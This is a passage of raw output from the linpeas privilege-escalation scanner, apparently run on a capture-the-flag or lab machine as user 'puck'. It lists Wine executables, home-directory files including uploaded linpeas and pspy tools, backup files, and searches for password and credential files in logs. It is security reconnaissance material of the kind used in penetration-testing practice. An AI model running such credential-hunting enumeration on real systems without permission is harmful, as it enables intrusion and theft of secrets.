2013-03-04+12:13:53.4975248450 /home/puck/.wine/drive_c/windows/system32/sc.exe
2013-03-04+12:13:53.4695248430 /home/puck/.wine/drive_c/windows/system32/unlodctr.exe
2013-03-04+12:13:53.4575248450 /home/puck/.wine/drive_c/windows/system32/wordpad.exe
2013-03-04+12:13:53.4495248440 /home/puck/.wine/drive_c/windows/system32/plugplay.exe
2013-03-04+12:13:53.4335248440 /home/puck/.wine/drive_c/windows/system32/cscript.exe
2013-03-04+12:13:53.4215248450 /home/puck/.wine/drive_c/windows/system32/lodctr.exe
2013-03-04+12:13:53.3895248420 /home/puck/.wine/drive_c/windows/system32/winefile.exe
2013-03-04+12:13:53.3895248420 /home/puck/.wine/drive_c/windows/system32/ipconfig.exe
2013-03-04+12:13:53.3815248430 /home/puck/.wine/drive_c/windows/system32/winemine.exe
2013-03-04+12:13:53.3535248410 /home/puck/.wine/drive_c/windows/system32/write.exe
2013-03-04+12:13:53.3535248410 /home/puck/.wine/drive_c/windows/system32/mshta.exe
2013-03-04+12:13:53.3215248420 /home/puck/.wine/drive_c/windows/system32/progman.exe
2013-03-04+12:13:53.2895248420 /home/puck/.wine/drive_c/windows/system32/winver.exe
2013-03-04+12:13:53.2855248420 /home/puck/.wine/drive_c/windows/system32/hostname.exe
2013-03-04+12:13:53.2815248410 /home/puck/.wine/drive_c/windows/system32/extrac32.exe
2013-03-04+12:13:53.2735248410 /home/puck/.wine/drive_c/windows/system32/secedit.exe
2013-03-04+12:13:53.2335248410 /home/puck/.wine/drive_c/windows/system32/termsv.exe
2013-03-04+12:13:53.2015248410 /home/puck/.wine/drive_c/windows/system32/netsh.exe
2013-03-04+12:13:53.1975248410 /home/puck/.wine/drive_c/windows/system32/cabarc.exe
2013-03-04+12:13:53.1815248390 /home/puck/.wine/drive_c/windows/system32/cmd.exe
2013-03-04+12:13:53.1215248390 /home/puck/.wine/drive_c/windows/system32/taskkill.exe
2013-03-04+12:13:53.0775248360 /home/puck/.wine/drive_c/windows/system32/winecfg.exe
2013-03-04+12:13:53.0575248370 /home/puck/.wine/drive_c/windows/system32/oleview.exe
2013-03-04+12:13:53.0135248360 /home/puck/.wine/drive_c/windows/system32/winemsibuilder.exe
2013-03-04+12:13:52.9695248360 /home/puck/.wine/drive_c/windows/system32/spoolsv.exe
2013-03-04+12:13:52.9575248350 /home/puck/.wine/drive_c/windows/system32/taskmgr.exe
2013-03-04+12:13:52.8575248340 /home/puck/.wine/drive_c/windows/system32/winevdm.exe
2013-03-04+12:13:52.8295248320 /home/puck/.wine/drive_c/windows/system32/net.exe
2013-03-04+12:13:52.8255248330 /home/puck/.wine/drive_c/windows/system32/control.exe
2013-03-04+12:13:52.8215248330 /home/puck/.wine/drive_c/windows/system32/rpcss.exe
2013-03-04+12:13:52.8175248330 /home/puck/.wine/drive_c/windows/system32/rundll32.exe
2013-03-04+12:13:52.7815248330 /home/puck/.wine/drive_c/windows/system32/wineboot.exe
2013-03-04+12:13:52.7695248320 /home/puck/.wine/drive_c/windows/system32/svchost.exe
2013-03-04+12:13:52.7575248320 /home/puck/.wine/drive_c/windows/system32/msiexec.exe
2013-03-04+12:13:52.7535248330 /home/puck/.wine/drive_c/windows/system32/uninstaller.exe
2013-03-04+12:13:52.7455248320 /home/puck/.wine/drive_c/windows/system32/expand.exe
2013-03-04+12:13:52.7295248320 /home/puck/.wine/drive_c/windows/system32/ping.exe
2013-03-04+12:13:52.7255248320 /home/puck/.wine/drive_c/Program Files/Internet Explorer/iexplore.exe
2013-03-04+12:13:52.7095248310 /home/puck/.wine/drive_c/windows/system32/wbem/mofcomp.exe
2013-03-04+12:13:52.7055248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v4.0.30319/ngen.exe
2013-03-04+12:13:52.7055248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v3.0/wpf/presentationfontcache.exe
2013-03-04+12:13:52.7055248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v3.0/windows communication foundation/servicemodelreg.exe
2013-03-04+12:13:52.7055248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v2.0.50727/regasm.exe
2013-03-04+12:13:52.7055248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v2.0.50727/ngen.exe
2013-03-04+12:13:52.7015248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v1.1.4322/regsvcs.exe
2013-03-04+12:13:52.7015248310 /home/puck/.wine/drive_c/windows/Microsoft.NET/Framework/v1.1.4322/ngen.exe

╔══════════╣ Unexpected in root
/vmlinuz                                                                                                                                                     
/vmlinuz.old
/selinux
/initrd.img
/initrd.img.old

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                            
/var/log/syslog

logrotate: bad argument --version: unknown error

╔══════════╣ Files inside /home/puck (limit 20)
total 896                                                                                                                                                    
drwx------ 8 puck puck   4096 Dec 20 19:19 .
drwxr-xr-x 5 root root   4096 Mar  4  2013 ..
-rw------- 1 puck puck      0 Mar  5  2013 .bash_history
-rw-r--r-- 1 puck puck    220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 puck puck   3637 Mar  4  2013 .bashrc
drwx------ 3 puck puck   4096 Mar  4  2013 .cache
-rwxr-xr-x 1 root root    513 Mar  6  2013 checksrv.sh
drwxrwxr-x 3 puck puck   4096 Mar  4  2013 .config
drwx------ 2 puck puck   4096 Dec 20 19:23 .gnupg
-rw------- 1 puck puck     55 Mar  5  2013 .lesshst
-rwxrwxr-x 1 puck puck 847825 Dec 20 19:12 linpeas.sh
drwxrwxr-x 3 puck puck   4096 Mar  4  2013 .local
-rw-r--r-- 1 puck puck    675 Mar  4  2013 .profile
-rwxrwxr-x 1 puck puck   5651 Dec 20 19:16 pspy32
-rwxrwxr-x 1 puck puck   5555 Dec 20 19:16 pspy32s
drwxrwxr-x 3 puck puck   4096 Mar  4  2013 web
drwxrwxr-x 4 puck puck   4096 Dec 20 18:09 .wine

╔══════════╣ Files inside others home (limit 20)
/usr/sbin/rmt-tar                                                                                                                                            
/usr/sbin/update-ca-certificates
/usr/sbin/pppdump
/usr/sbin/ntpdate-debian
/usr/sbin/grub-install
/usr/sbin/update-initramfs
/usr/sbin/groupdel
/usr/sbin/newusers
/usr/sbin/arpd
/usr/sbin/fdformat
/usr/sbin/install-info
/usr/sbin/lpinfo
/usr/sbin/laptop-detect
/usr/sbin/update-fonts-dir
/usr/sbin/cppw
/usr/sbin/update-grub
/usr/sbin/update-default-wordlist
/usr/sbin/chat
/usr/sbin/update-gsfontmap
/usr/sbin/lpc
grep: write error: Broken pipe

╔══════════╣ Searching installed mail applications
                                                                                                                                                             
╔══════════╣ Mails (limit 50)
                                                                                                                                                             
╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 198 Mar  4  2013 /var/lib/belocs/hashfile.old                                                                                         
-rw-r--r-- 1 root root 128 Mar  4  2013 /var/lib/sgml-base/supercatalog.old
-rw-r--r-- 1 root root 4001824 Mar  4  2013 /var/lib/aptitude/pkgstates.old
-rw-r--r-- 1 root root 673 Mar  4  2013 /etc/xml/xml-core.xml.old
-rw-r--r-- 1 root root 610 Mar  4  2013 /etc/xml/catalog.old
-rw-r--r-- 1 root root 0 Feb 25  2013 /usr/src/linux-headers-3.5.0-25-generic/include/config/wm831x/backup.h
-rw-r--r-- 1 root root 154511 Feb 25  2013 /usr/src/linux-headers-3.5.0-25-generic/.config.old
-rw-r--r-- 1 root root 11036 Mar  4  2013 /usr/share/info/dir.old
-rw-r--r-- 1 root root 960 Sep 26  2012 /usr/share/help-langpack/en_AU/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 738 Sep 26  2012 /usr/share/help-langpack/en_AU/deja-dup/backup-first.page
-rw-r--r-- 1 root root 1718 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 1422 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 3171 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2384 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1289 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2498 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2335 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2016 Oct  9  2012 /usr/share/help-langpack/en_AU/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 960 Sep 26  2012 /usr/share/help-langpack/en_GB/deja-dup/backup-auto.page
-rw-r--r-- 1 root root 738 Sep 26  2012 /usr/share/help-langpack/en_GB/deja-dup/backup-first.page
-rw-r--r-- 1 root root 1718 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 1422 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 3171 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2372 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1289 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2499 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2335 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2018 Oct  9  2012 /usr/share/help-langpack/en_GB/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 2243 Sep 28  2012 /usr/share/help-langpack/en_GB/evolution/backup-restore.page
-rw-r--r-- 1 root root 1730 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-check.page
-rw-r--r-- 1 root root 1429 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-restore.page
-rw-r--r-- 1 root root 3190 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-thinkabout.page
-rw-r--r-- 1 root root 2389 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-how.page
-rw-r--r-- 1 root root 1296 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-why.page
-rw-r--r-- 1 root root 2535 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-what.page
-rw-r--r-- 1 root root 2348 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-where.page
-rw-r--r-- 1 root root 2032 Oct  9  2012 /usr/share/help-langpack/en_CA/ubuntu-help/backup-frequency.page
-rw-r--r-- 1 root root 7867 Oct  2  2012 /usr/share/doc/telnet/README.telnet.old.gz
-rw-r--r-- 1 root root 6388 Feb 25  2013 /lib/modules/3.5.0-25-generic/kernel/drivers/power/wm831x_backup.ko

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/mlocate/mlocate.db: regular file, no read permission                                                                                          


╔══════════╣ Web files?(output limit)
                                                                                                                                                             
╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Mar  4  2013 /var/lib/apt/lists/partial/.delete-me-later                                                                            
-rw-r--r-- 1 root root 628 Mar  4  2013 /etc/apparmor.d/cache/.features
-rw------- 1 root root 0 Mar  4  2013 /etc/.pwd.lock
-rw-r--r-- 1 root root 220 Sep 19  2012 /etc/skel/.bash_logout
-rw-r--r-- 1 puck puck 220 Mar  4  2013 /home/puck/.bash_logout
-rw-rw-r-- 1 puck puck 11 Mar  4  2013 /home/puck/.wine/.update-timestamp

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rw------- 1 puck puck 0 Dec 20 18:09 /tmp/.wine-1002/server-ca01-21bec/lock                                                                                 

╔══════════╣ Searching passwords in history files
                                                                                                                                                             
╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password                                                                                                                                   
/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/pppd/2.4.5/passwordfd.so
/usr/share/gnome/help-langpack/zenity/en_GB/password.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_AU/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_CA/ubuntu-help/user-goodpassword.page
/usr/share/help-langpack/en_GB/empathy/irc-nick-password.page
/usr/share/help-langpack/en_GB/evince/password.page
/usr/share/help-langpack/en_GB/file-roller/password-protection.page
/usr/share/help-langpack/en_GB/file-roller/troubleshooting-password.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-changepassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-forgottenpassword.page
/usr/share/help-langpack/en_GB/ubuntu-help/user-goodpassword.page
/usr/share/locale-langpack/en_AU/LC_MESSAGES/credentials-control-center.mo
/usr/share/locale-langpack/en_GB/LC_MESSAGES/credentials-control-center.mo
/usr/share/man/man7/credentials.7.gz
/usr/share/pam/common-password
/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                             
╔══════════╣ Searching passwords inside logs (limit 70)
2013-03-04 15:13:47 configure base-passwd:i386 3.5.26 3.5.26                                                                                                 
2013-03-04 15:13:47 install base-passwd:i386 <none> 3.5.26
2013-03-04 15:13:47 status half-configured base-passwd:i386 3.5.26
2013-03-04 15:13:47 status half-installed base-passwd:i386 3.5.26
2013-03-04 15:13:47 status installed base-passwd:i386 3.5.26
2013-03-04 15:13:47 status unpacked base-passwd:i386 3.5.26
2013-03-04 15:13:50 status half-configured base-passwd:i386 3.5.26
2013-03-04 15:13:50 status half-installed base-passwd:i386 3.5.26
2013-03-04 15:13:50 status unpacked base-passwd:i386 3.5.26
2013-03-04 15:13:50 upgrade base-passwd:i386 3.5.26 3.5.26
2013-03-04 15:13:54 install passwd:i386 <none> 1:4.1.4.2+svn3283-3ubuntu7
2013-03-04 15:13:54 status half-installed passwd:i386 1:4.1.4.2+svn3283-3ubuntu7
2013-03-04 15:13:55 status unpacked passwd:i386 1:4.1.4.2+svn3283-3ubuntu7
2013-03-04 15:13:58 configure base-passwd:i386 3.5.26 <none>
2013-03-04 15:13:58 status half-configured base-passwd:i386 3.5.26
2013-03-04 15:13:58 status installed base-passwd:i386 3.5.26
2013-03-04 15:13:58 status unpacked base-passwd:i386 3.5.26
2013-03-04 15:14:01 configure passwd:i386 1:4.1.4.2+svn3283-3ubuntu7 <none>
2013-03-04 15:14:01 status half-configured passwd:i386 1:4.1.4.2+svn3283-3ubuntu7
2013-03-04 15:14:01 status installed passwd:i386 1:4.1.4.2+svn3283-3ubuntu7
2013-03-04 15:14:01 status unpacked passwd:i386 1:4.1.4.2+svn3283-3ubuntu7
Binary file /var/log/installer/initial-status.gz matches
Description: Set up users and passwords



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                           
                                ╚════════════════╝                                                                                                           
Regexes to search for API keys aren't activated, use param '-r' 

```